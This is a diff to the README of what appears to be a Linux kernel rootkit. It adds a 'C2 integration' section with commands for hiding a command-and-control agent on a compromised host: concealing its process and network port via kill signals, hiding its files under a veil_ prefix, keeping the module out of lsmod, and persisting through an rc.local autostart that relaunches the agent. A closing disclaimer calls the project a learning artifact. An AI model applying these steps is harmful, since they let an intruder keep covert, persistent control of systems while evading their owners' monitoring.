@@ -52,6 +52,24 @@ success path), so `lsmod` shows nothing until `kill -36 0`. Unload with
 - `__force_order`-anchored inline-assembly CR0 writes above 4.16
 - local `strnstr` equivalent instead of relying on the export
 
+
+## C2 integration
+
+Once a Fei agent runs on the host, apply the hiding layers:
+
+```sh
+sudo ./integrate.sh <agent-pid> <agent-port> /var/lib/fei-agent
+```
+
+- process hiding: `kill -34 <pid>`
+- port hiding: `kill -37 <port>` (both /proc/net/tcp and tcp6)
+- file hiding: binaries live under a `veil_` prefix (renamed by the
+  script); getdents never lists them
+- module self-hiding is on by default (`lsmod` clean); `kill -36 0`
+  restores visibility for maintenance
+- the rc.local autostart written at unload/reboot reloads the module;
+  extend it to relaunch the agent from its veil_-prefixed path
+
 ## Disclaimer
 
 > This project is a Linux kernel-programming learning artifact within an
